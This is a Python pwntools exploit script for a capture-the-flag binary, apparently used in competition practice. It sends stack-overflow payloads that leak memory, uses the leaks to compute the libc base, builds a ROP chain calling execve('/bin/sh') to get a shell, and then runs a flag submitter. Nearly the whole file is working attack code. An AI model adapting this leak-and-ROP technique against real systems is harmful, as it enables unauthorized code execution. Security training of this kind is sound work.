from pwn import *

var = os.getenv("DEBUGINFOD_URLS")

binary_name = "challenge"
exe  = ELF(binary_name, checksec=True)
libc = ELF("/libc.so.6" if var is None else "libc.so.6", checksec=False)
context.binary = exe

ru  = lambda *x: r.recvuntil(*x)
rl  = lambda *x: r.recvline(*x)
rc  = lambda *x: r.recv(*x)
sla = lambda *x: r.sendlineafter(*x)
sa  = lambda *x: r.sendafter(*x)
sl  = lambda *x: r.sendline(*x)
sn  = lambda *x: r.send(*x)

if var is None:
    HOST = os.environ.get("HOST", "localhost")
    PORT = 31337
    r = connect(HOST, int(PORT))
elif args.GDB:
    r = gdb.debug(f"debug_dir/{binary_name}", """
		brva 0x000000000000179f
        c
    """, aslr=True)
else:
    r = process(f"debug_dir/{binary_name}")

sla(b"?\n", b"10")
sla(b"?\n", b"3")

sa(b"?\n", b"a" * 9 + b"\xff")
rl()
stack = b"\xff" * (0x51 - 12) + p8(0x8) + b"a" * 22 + b"A" * 4 + b"A" * 4 + b"A" * 4 + b"A" * 4 + p8(0xff)
# sa(b"?\n", b"A" * 108 + p8(0x7a) + b"A" * 17 + p64(0x1337) + b"a" * 0x100)
sa(b"?\n", stack)
rl()
res = ru(b"What")[:-5]
res = res.replace(b"\x1b[0m", b"")
res = res.replace(b"\x1b[1;30;42m", b"")
res = res.replace(b"\x1b[1;30;43m", b"")
res = res[1::3]
res = res[4:]
while len(res) % 8 != 0:
	res += b"\x00"
# print(res)
leaks = unpack_many(res)
# for i, p in enumerate(leaks):
# 	print(f"leak {i}: {hex(p)}")

libc.address = leaks[17] - 0x29d90
print(hex(libc.address))

rop = ROP(libc)
rop.execve(next(libc.search(b"/bin/sh")), 0, 0)

# stack = b"\xff" * (0x51 - 12 - 10) + p8(0x8) + b"a" * 22 + b"A" * 4 + b"A" * 4 + b"A" * 4 + b"A" * 4 + p8(0x70 + 17) + rop.chain() + b"\x00" * 10 + b"a" * 100
stack = b"\xff" * (0x51 - 12 - 10) + p8(0x8) + b"a" * 22 + b"A" * 4 + b"A" * 4 + b"A" * 4 + b"A" * 4 + p8(0x70 + 17)
stack += rop.chain() + b"\x00" * 0x100 + b"a" * 100
sa(b"?\n", stack)
sl()


# r.interactive()
# after shell xd
r.sendline(b'./submitter')
print(r.recvall(timeout=1))
